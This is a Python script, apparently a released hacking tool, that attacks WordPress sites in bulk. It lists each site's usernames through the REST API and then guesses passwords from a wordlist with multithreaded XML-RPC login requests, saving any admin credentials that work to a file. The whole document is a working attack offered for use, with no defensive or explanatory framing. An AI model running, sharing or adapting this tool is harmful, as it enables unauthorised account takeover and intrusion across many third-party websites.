import requests
import sys
import json
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor

def getlist():
	while True:
		try:
			if len(sys.argv) > 1:
				return open(sys.argv[1], "r").readlines()
			else:
				print(colored("[!] Something Wrong !", "red"))
				sys.exit()
		except IOError as e:
			print(colored("[!] Not valid !", "red"))
			return False

def fetching_user(url):
	print(colored("[!] Fetching user from {}".format(url), "blue"))
	user_list = []
	try:
		req = requests.get(url+"/wp-json/wp/v2/users/", allow_redirects=False).content.decode('utf-8')
		try:
			print(colored("[!] Success Fetching user from {}".format(url), "green"))
			for x in json.loads(req):
				user_list.append(x['slug'])
		except ValueError:
			print(colored("[!] Failed {} to Decoding json !\n".format(url), "red"))
		
	except Exception as e:
		print(colored("[!] Something Wrong !", "red"))

	return user_list
def check_array(arr): 
    if len(arr) == 0: 
        return 0
    else: 
        return 1
def save(format):
	s = open("brute-force-result.txt", "a+")
	s.write(format+"\n")

def exploit(url, user_url, list_password):
	try:
		payloads = """<?xml version=1.0?><methodCall>
		<methodName>wp.getUsersBlogs</methodName>
		<params>
		<param><value>{}</value></param>
		<param><value>{}</value></param>
		</params>
		</methodCall>""".format(user_url, list_password)

		headers = {'Content-Type':'text/xml'}
		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads)
		if "isAdmin" in str(r.content):
			print(colored("[+] Found username and password website {} ".format(url), "green"))
			print(colored("[+] Success Login With username {} password {}".format(user_url, list_password), "blue"))
			save("success login with username [{}] and password [{}] sites {}".format(user_url,list_password,url))
		else:
			print(colored("[+] Failed Login {} With username {} password {}".format(url,user_url, list_password), "red"))
	except requests.exceptions.ConnectionError as e:
		print(colored("[!] ConnectionError :(", "red"))
	except Exception as e:
			print(colored("[!] Something Wrong :(", "red"))

def brute_url(url):
	try:
		username_url = fetching_user(url)
		user = []
		if check_array(username_url):
			for username in username_url:
				user.append(username)
		else:
			print(colored('[+] try With default username admin', "green"))
			user.append("admin")

		password = "wordlist.txt"

		with ThreadPoolExecutor(max_workers=10) as executor:
			for user_url in user:
				with open(password, "r") as password_list:
					for list_password in password_list:
						executor.submit(exploit,url,user_url,list_password)


			user.clear()
	except requests.exceptions.ConnectionError as e:
		print(colored("[!] ConnectionError :(", "red"))
	except Exception as e:
		print(colored("[!] Something Wrong :(", "red"))

def main():
 	try:
 		list_target = getlist()
 		for sites in list_target:
 			url = sites.rstrip()
 			brute_url(url)
 	except KeyboardInterrupt as e:
 		print("[!] Exit Program")
 		sys.exit()

if __name__ == "__main__":
	banner = """┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┇    Multiple Brute Force XMLRPC [Wordpress]      ┇
┇        Created by c0delabs Team                 ┇
┇ I don't hope you like all of my Tools Thx       ┇
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"""
	print(banner)
	main()